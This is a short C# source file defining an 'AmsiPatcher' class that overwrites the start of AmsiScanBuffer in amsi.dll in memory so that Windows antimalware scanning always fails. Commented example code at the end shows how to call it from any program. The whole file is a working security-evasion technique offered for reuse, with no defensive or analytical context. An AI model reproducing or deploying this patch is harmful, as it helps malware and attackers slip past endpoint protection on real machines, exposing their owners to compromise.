using System;
using System.Runtime.InteropServices;

namespace Patch
{
    internal class AmsiPatcher
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        private static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        public void Patch()
        {
            IntPtr Library = LoadLibrary("amsi.dll");
            IntPtr Address = GetProcAddress(Library, "AmsiScanBuffer");
            uint p;
          
            byte[] Patch = {
                0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3
            };
          
            VirtualProtect(Address, (UIntPtr)Patch.Length, 0x40, out p);
            Marshal.Copy(Patch, 0, Address, Patch.Length);
            VirtualProtect(Address, (UIntPtr)Patch.Length, p, out p);
        }
    }
}

// You can call this Patcher now in any file with 'patcher.Patch();'
// Example:

// using System;
// namespace Patch
// {
//     internal static class Program
//     {
//         [STAThread]
//         static void Main()
//         {
//             AmsiPatcher patcher = new AmsiPatcher();
//             patcher.Patch();
//             
//             Console.WriteLine("Patched");
//         }
//     }
// }
